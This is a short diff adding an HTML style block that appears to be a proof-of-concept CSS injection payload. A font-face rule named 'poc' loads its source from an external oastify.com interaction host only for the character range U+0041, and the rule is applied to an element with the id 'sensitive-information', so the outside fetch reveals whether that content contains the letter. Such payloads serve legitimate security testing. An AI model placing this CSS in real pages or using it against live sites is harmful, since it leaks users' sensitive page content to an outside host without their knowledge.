@@ -1,0 +1,11 @@
+<style>
+@font-face{
+ font-family:poc;
+ src: url(http://grb06s1nxtvb53kazobm3s6zvq1ip9dy.oastify.com); /* fetched */
+ unicode-range:U+0041;
+}
+
+#sensitive-information{
+ font-family:poc;
+}
+</style>
